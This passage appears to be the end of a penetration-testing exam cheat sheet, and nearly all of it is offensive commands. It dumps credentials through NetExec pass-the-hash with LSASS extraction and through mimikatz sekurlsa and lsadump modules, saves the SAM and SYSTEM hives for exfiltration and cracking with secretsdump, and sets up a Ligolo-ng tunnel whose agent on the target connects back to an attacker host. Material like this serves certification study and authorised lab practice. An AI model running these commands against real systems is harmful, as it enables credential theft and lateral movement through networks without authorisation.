nxc smb TARGET -u Administrator -H HASH --local-auth --lsass
# Local (mimikatz):
.\mimikatz.exe "privilege::debug" "token::elevate" "sekurlsa::msv" "lsadump::sam" "exit"
# Local (manual SAM+SYSTEM exfil):
reg save HKLM\SAM C:\sam
reg save HKLM\SYSTEM C:\system
# Transfer to Kali, then:
impacket-secretsdump -sam sam -system system LOCAL
```

### Ligolo-ng Pivot Setup:
```bash
# On Kali (proxy):
sudo ip tuntap add user kali mode tun ligolo
sudo ip link set ligolo up
./proxy -selfcert -laddr 0.0.0.0:11601
# After agent connects:
sudo ip route add 172.16.X.0/24 dev ligolo
# On target (agent):
.\agent.exe -connect KALI:11601 -ignore-cert
# In proxy console: session → start
```

```
# ═══════════════════════════════════════════════════════
# END EXAM BATTLE LOG
# ═══════════════════════════════════════════════════════
```
